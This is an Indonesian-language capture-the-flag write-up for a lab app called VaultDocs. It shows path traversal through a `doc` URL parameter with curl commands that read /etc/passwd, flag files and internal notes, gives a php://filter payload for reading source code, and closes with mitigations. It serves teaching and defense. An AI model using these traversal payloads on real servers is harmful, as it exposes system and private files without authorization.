# WRITEUP · 02 VaultDocs (SPOILER)

## 1. Recon

Buka aplikasinya, klik satu dokumen. Perhatikan URL:

```
http://<target>/?doc=welcome.txt
```

Parameter `doc` berisi **nama file**. Tebakan: nilai itu dipakai untuk membuka
file di server. Kalau benar, kita mungkin bisa menyuruhnya membuka file lain.

## 2. Uji path traversal

Aplikasi mengambil file dari folder `pages/`. Dengan `../` kita naik keluar dari
folder itu. Pastikan dulu traversal jalan dengan file yang pasti ada:

```bash
curl -s 'http://<target>:8002/?doc=../../../../../../etc/passwd'
```

Kalau isi `/etc/passwd` muncul, traversal berhasil. Dari situ kita lihat ada
user bernama `analyst`.

## 3. Ambil flag user

**Mode docker:** flag ada di `/home/analyst/user.txt`:

```bash
curl -s 'http://<target>:8002/?doc=../../../../../../home/analyst/user.txt' | grep -o 'FLAG{[^}]*}'
```

Bonus (information disclosure) — catatan internal yang bocor:

```bash
curl -s 'http://<target>:8002/?doc=../../../../../../opt/vaultdocs/notes.txt'
```

**Mode lite:** flag diletakkan 2 folder di atas folder dokumen:

```bash
curl -s 'http://127.0.0.1:9002/?doc=../../user.txt' | grep -o 'FLAG{[^}]*}'
```

(Berapa banyak `../` yang dibutuhkan tergantung kedalaman folder. Kalau ragu,
tambah terus `../` — kelebihan `../` di root sistem tidak masalah.)

## 4. Catatan: php:// wrapper

Di aplikasi yang menyambung input TANPA prefiks folder, Anda sering bisa membaca
**source code PHP** (yang normalnya dieksekusi, bukan ditampilkan) dengan wrapper
`php://filter`:

```
?doc=php://filter/convert.base64-encode/resource=index.php
```

Hasilnya base64 dari source; decode untuk membacanya. Di VaultDocs ini tidak
jalan karena input selalu diawali path folder `pages/`, sehingga `php://`
rusak. Ini pelajaran bagus: detail kecil pada kode mengubah teknik yang bisa dipakai.

## 5. Pelajaran & mitigasi

- **Jangan** memasukkan input user ke path file mentah-mentah.
- Pakai **whitelist**: cocokkan `doc` dengan daftar nama file yang diizinkan,
  atau petakan id → file. Mis. `if (!isset($menu[$doc])) die('invalid');`
- Kalau harus menerima nama file, ambil hanya `basename($doc)` dan pastikan hasil
  `realpath()` tetap berada di dalam folder yang diizinkan.
- Simpan file sensitif di luar jangkauan aplikasi, dan jalankan web server dengan
  hak sekecil mungkin.
